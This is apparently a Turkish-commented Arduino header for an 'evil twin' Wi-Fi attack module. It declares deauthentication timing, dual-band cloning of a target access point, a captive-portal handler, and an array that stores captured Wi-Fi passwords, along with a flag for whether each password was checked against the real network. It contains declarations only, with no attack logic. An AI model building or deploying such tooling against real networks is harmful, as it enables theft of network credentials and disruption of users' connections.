#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <Arduino.h>
#include "WiFiClient.h"

// ─── Yapılandırma ──────────────────────────────────────────────────────────────
#define ET_MAX_PASSWORDS       20
#define ET_AP_IP_STR           "192.168.1.1"
#define ET_DEAUTH_INTERVAL_MS  200UL      // Deauth burst aralığı (ms) — daha agresif
#define ET_VERIFY_TIMEOUT_MS   8000UL    // Şifre doğrulama zaman aşımı (ms)
#define ET_RETRACK_INTERVAL_MS 300000UL  // Hedef yeniden tarama aralığı (ms) — 5 dk, AP her 30sn kapanmasın

// ─── Kaydedilen şifre yapısı ──────────────────────────────────────────────────
struct ETPassword {
  String ssid;
  String password;
  bool   verified;
};

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
extern bool       evil_twin_active;
extern String     evil_twin_ssid;
extern int        evil_twin_channel;
extern uint8_t    evil_twin_bssid[6];
extern int        evil_twin_clients;
// ── Çift bant desteği ────────────────────────────────────────────────────────
extern bool       evil_twin_dual_band;
extern uint8_t    evil_twin_bssid2[6];
extern int        evil_twin_channel2;
extern String     evil_twin_ssid2;
// ─────────────────────────────────────────────────────────────────────────────
extern ETPassword et_passwords[ET_MAX_PASSWORDS];
extern int        et_password_count;
extern bool       et_last_verify_ok;
extern String     et_last_verify_pass;

// ─── Yardımcı fonksiyonlar ───────────────────────────────────────────────────
String et_html_escape(const String &s);

// ─── Fonksiyon bildirimleri ───────────────────────────────────────────────────
void start_evil_twin(int scan_idx);
void stop_evil_twin();
void evil_twin_loop();

bool evil_twin_portal_handle(WiFiClient &client,
                             const String &request,
                             const String &path);

#endif
